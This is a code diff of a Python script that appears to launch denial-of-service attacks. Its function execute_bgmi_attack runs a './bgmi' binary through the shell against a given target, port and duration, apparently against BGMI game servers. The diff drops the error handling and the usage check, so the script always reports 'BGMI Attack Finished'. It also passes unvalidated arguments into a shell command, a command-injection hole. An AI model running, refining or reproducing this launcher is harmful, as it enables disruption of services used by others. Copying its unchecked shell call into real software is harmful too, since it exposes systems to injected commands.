@@ -24,23 +24,10 @@ def execute_bgmi_attack(target, port, time):
     full_command = f"./bgmi {target} {port} {time} 500"
 
     # Execute the command
-    result = subprocess.run(full_command, shell=True, capture_output=True, text=True)
-
-    # Check the result
-    print(result)
-    if result.returncode == 0:
-        # Command executed successfully
-        response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
-    else:
-        # Command failed
-        response = "Error: BGMI Attack failed."
+    subprocess.run(full_command, shell=True)
+    response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
 
     return response
-
-# Check if arguments are provided
-if len(sys.argv) != 4:
-    print("Usage: python attack.py <target> <port> <time>")
-    sys.exit(1)
 
 # Extract target, port, and time from command-line arguments
 target = sys.argv[1]
